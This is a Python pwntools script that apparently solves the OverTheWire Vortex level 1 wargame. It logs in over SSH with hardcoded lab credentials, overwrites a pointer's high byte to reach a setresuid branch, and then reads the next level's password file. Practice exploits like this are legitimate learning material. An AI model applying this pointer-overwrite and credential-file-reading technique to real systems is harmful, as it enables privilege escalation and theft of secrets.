from pwn import *
import time

HOST = 'vortex.labs.overthewire.org'
USERNAME = 'vortex1'
PASS = 'Gq#qu3bF3'

s = ssh(host=HOST, user=USERNAME, password=PASS, port=2228)

print("HERE")
location = "/vortex"
file_name = '%s/vortex1' % location
password_file = '/etc/vortex_pass/vortex2'
r = s.run(file_name)

#need to overwrite the MSB of the ptr variable; through stack analysis I found this
buff_size = 512
ptr_loc = buff_size / 2
getchar_size = 4

#location of where we want to write 0xca so we can pass the if statement and setresuid
where_to_write = ptr_loc + getchar_size + 1
print(type(where_to_write))
r.send('\\' * int(where_to_write))
r.send('\xca') #write the value we want
r.send('\\') #send the pointer back one
r.send('\xff') #this value doesn't matter just want to make sure the case that initiates function e() gets triggered

#get rid of any junk from the buffer
r.clean()

#give time for hack to work
time.sleep(1)

r.sendline('cat %s' % password_file) #read the password file
log.success('Password: %s' % r.recv().strip()) #log the password on screen